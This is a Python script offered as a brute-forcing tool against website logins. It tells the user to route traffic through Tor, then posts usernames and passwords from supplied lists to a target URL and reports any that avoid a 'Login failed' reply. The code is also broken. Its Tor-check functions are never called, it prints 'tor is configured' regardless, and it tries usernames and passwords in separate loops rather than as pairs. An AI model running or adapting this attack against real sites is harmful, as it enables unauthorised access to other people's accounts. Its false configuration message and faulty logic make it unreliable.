#!/usr/bin/python

import requests
from pip._vendor.distlib.compat import raw_input
import time

print("[+]..This is a bruteforcing tool")
time.sleep(5)


print("[+]..Some instructions before using the tool. ")
time.sleep(2)
print("[+]..first install tor and configure it before starting the attack")
time.sleep(2)
print("[+]..store the username for which you have to bruteforce in a txt file")
time.sleep(2)
print("[+]..store the password list in a file ")

#function to see if tor is properly configured

def checkTor(self):
    isConfigured = False
    if self.useTor:
        self.setupTOR()
    if self.proxies:
        try:
            response = requests.get('https://check.torproject.org/', headers=self.getSpoofedHeaders(),
                                    proxies=self.proxies)
            if self.CHECK_TOR_REGEX.search(response.text):
                isConfigured = True
        except Exception as e:
            print(e)
    return isConfigured


#setting the proxy to use with tor
def setupTOR(self):
    self.proxies = {'http':'socks5://localhost:9050','https':'socks5://localhost:9050'}

checkTor = True
print("[+].. tor is configured")

target_url = raw_input("enter the target website for bruteforcing: ")

#variable for storing the username

username_list = raw_input("enter the path of the file where username is stored: ")


#variable for storing the passwords
password_list = raw_input("enter the path of the password list: ")


#data dict for taking the values for the input function specifying for each parameter

data_dict = {"username": "", "password": "", "Login": "submit"}


# taking the path for the username

with open(username_list, "r") as passlist:
    for line in passlist:
        word = line.strip()
        data_dict["username"] = word
        response = requests.post(target_url, data= data_dict)
        if "Login failed" not in response.content:
            print("[+] for the username -->" + word)



# taking the path for the passwordlist

with open(password_list, "r") as wordlist:
    for line in wordlist:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data= data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password -->" + word)
            exit()


print("[+] Reached end of line")

